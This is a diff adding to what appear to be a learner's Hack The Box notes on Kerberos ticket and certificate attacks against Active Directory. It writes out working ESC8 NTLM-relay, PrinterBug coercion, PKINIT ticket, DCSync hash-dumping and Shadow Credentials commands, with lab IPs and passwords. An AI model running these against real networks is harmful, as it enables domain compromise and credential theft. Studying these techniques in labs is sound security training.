@@ -31,6 +31,13 @@
   - [[#ptt-w-ps-remoting-windows][PtT w PS Remoting (Windows)]]
     - [[#mimikatz-3][Mimikatz]]
     - [[#rubeus-3][Rubeus]]
+- [[#pass-the-ticket-linux-after-port-fwd][Pass the Ticket (Linux) (After Port fwd)]]
+  - [[#kerberos-on-linux][Kerberos on Linux]]
+    - [[#keytab][Keytab]]
+- [[#pass-the-certificate][Pass the Certificate]]
+  - [[#ad-cs-ntlm-relay-attack-esc8][AD CS NTLM Relay Attack (ESC8)]]
+  - [[#shadow-credentials-msds-keycredentiallink][Shadow Credentials (msDS-KeyCredentialLink)]]
+  - [[#no-pkinit][No PKINIT]]
 
 * Pass the Hash (PtH)
 + attacker uses password hash instead of plain text passwords for authentication
@@ -728,5 +735,95 @@ PS C:\tools> Enter-PSSession -ComputerName DC01
 [DC01]: PS C:\Users\john\Documents> whoami
 inlanefreight\john
 [DC01]: PS C:\Users\john\Documents> hostname
-DC01
+DC01$
 #+end_src
+
+
+* TODO Pass the Ticket (Linux) (After Port fwd)
+- linux comps can connect to AD to provide centralised ID mgmt & integrate w organisation's systems
+- gives users ability to have single ID to auth on linux/win
+- linux connected to AD commonly uses *kerberos as auth*
+
+***** linux machine not connected to AD could use Kerberos tickets in scripts or to auth to network. Not a requirement to be joined to domain to use kerberos tickets from linux machine
+
+** Kerberos on Linux
+- win & linux use same process to request =TGT= & =TGS=
+- store ticket info depends on distro & impl
+- usually stored as =ccache= file in =/tmp=
+- location of kerberos ticket stored in envar =KRB5CCNAME=
+- var can ID if tickets are being used || default location for storing has been changed
+- =ccache= files protected by specific r/w perms
+
+*** Keytab
+- everyday use of kerberos on linux
+- file containing pairs of Kerberos principals & encrypted keys (derived from Kerberos passw)
+- keytab file used to auth to remote systems using kerberos w/out password
+- must recreate all keytab files on passw change
+- allow scripts to auth automatically
+
+* Pass the Certificate
+- =PKINIT= (*Public Key Cryptology for Initial Authentication*)
+  - extension of kerberos protocol
+  - enables use of public key cryptography during init auth exchange
+  - used to support user logons via smartcards (store priv keys)
+- =PtC= -> Technique of using X.509 certs to successfully obtain =TGTs=.
+- method used alongside attacks against AD cert srv && shadow creds attacks
+
+** AD CS NTLM Relay Attack (ESC8)
+- =ESC8= -> NTLM relay attack targeting ADCS HTTP endpoint.
+- =ADCS= supports multiple enrollment methods
+- cert auth configured to allow *web enrollment* hosts application at =/CertSrv=
+- can use =ntlmrelayx= -> listen for inbound connections * relay to web enrollment srv
+  - ~impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication~
+    - value pass to ~--template~ -> cert template used by DC for auth. can be enumerated w =certipy=
+- coerce victim into authenticating against arbitrary hosts by exploiting [[https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py][printer bug]] -> requires target machine Cc to have =printer spooler= srv running
+  - ~python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12~
+- perform =PtC= attack to obtain TGT as =DC01$= -> [[https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py][gettgtpkinit.py]]
+#+begin_src bash
+biscuitrescue@htb[/htb]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
+biscuitrescue@htb[/htb]$ python3 -m venv .venv
+biscuitrescue@htb[/htb]$ source .venv/bin/activate
+biscuitrescue@htb[/htb]$ pip3 install -r requirements.txt
+#+end_src
+
+- start attack
+  - ~python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx  -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache~
+- after we obtain TGT -> PtT. can perform DCSync attack from DC's machine acc to retrieve NTLM hash of domain admin acc
+#+begin_src bash
+biscuitrescue@htb[/htb]$ export KRB5CCNAME=/tmp/dc.ccache
+biscuitrescue@htb[/htb]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
+<SNIP>
+#+end_src
+
+** Shadow Credentials (msDS-KeyCredentialLink)
+- AD attack that abuses =msDS-KeyCredentialLink= attr of victim user
+- =AddKeyCredentialLink= attr stores public keys that can be used for auth via PKINIT
+- =AddKeyCredentialLink= edge in BloodHound indicates that one user has write perms over another's msDS-KeyCredentialLink attr
+- =pywhisker= to attack from Linux system
+
+- ~pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add~ -> gens =x.509= cert & writes pub key to victim user's =msDS-KeyCredentialLink=. generates =PFX= -> gettgtpkinit.py
+
+- ~python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache~
+
+- PtH after tgt
+#+begin_src bash
+biscuitrescue@htb[/htb]$ export KRB5CCNAME=/tmp/jpinkman.ccache
+biscuitrescue@htb[/htb]$ klist
+
+Ticket cache: FILE:/tmp/jpinkman.ccache
+Default principal: jpinkman@INLANEFREIGHT.LOCAL
+
+Valid starting       Expires              Service principal
+04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
+#+end_src
+- connect via evil-winrm
+
+** No PKINIT
+- attacker may be able to obtain cert but be unable to use for pre-auth as victims d/t KDC not supporting appropriate EKU
+- use =PassTheCert=
